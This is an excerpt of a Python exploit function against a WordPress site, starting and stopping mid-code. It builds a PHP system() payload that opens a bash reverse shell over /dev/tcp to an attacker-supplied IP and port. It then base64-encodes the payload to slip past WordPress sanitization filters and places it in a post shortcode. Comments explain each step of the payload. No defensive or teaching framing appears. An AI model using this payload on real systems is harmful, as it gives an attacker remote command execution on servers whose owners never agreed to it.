...
def exploit(target_url, post_id_to_update, attacker_ip, attacker_port):
    ...
    # THE FINAL PAYLOAD:
    # 1. It's a valid PHP statement: system(...);
    # 2. It uses system() to execute a shell command.
    # 3. It uses bash -c '...' to ensure bash interprets the inner command.
    # 4. It uses double quotes for system() to avoid conflicting with bash -c's single quotes.
    raw_payload = f"system(\"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1\");"
    
    # We encode the payload in Base64 to bypass WordPress's sanitization filters.
    encoded_payload = base64.b64encode(raw_payload.encode('utf-8')).decode('utf-8')
    
    # The final content for the post includes the shortcode with the encoded payload.
